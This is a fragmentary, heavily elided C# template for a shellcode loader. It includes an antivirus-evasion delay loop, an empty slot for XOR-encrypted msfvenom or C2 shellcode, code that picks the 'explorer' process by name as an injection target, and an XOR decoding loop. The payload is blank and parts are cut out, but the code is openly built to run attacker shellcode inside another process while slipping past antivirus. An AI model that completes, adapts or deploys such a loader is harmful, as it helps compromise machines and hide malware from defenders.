...
namespace Jake
{
    ...
    {      
        ...
        public static void Main(string[] args)
        {
            ...
            // Iterating through a huge loop to discourage AV from enumating the rest of the program
            int count = 0;
            int max = 900000000;
            for (int i = 0; i < max; i++)
            {
            ...
            byte[] pie = new byte[599] {

            //shellcode generated by msfvenom in csharp format (or other C2) xor encrypted
};


            Process[] PID = Process.GetProcessesByName("explorer"); // Change the process name
            ...
            {
                pie[i] = (byte)((uint)pie[i] ^ 0xff); //Change this
            }
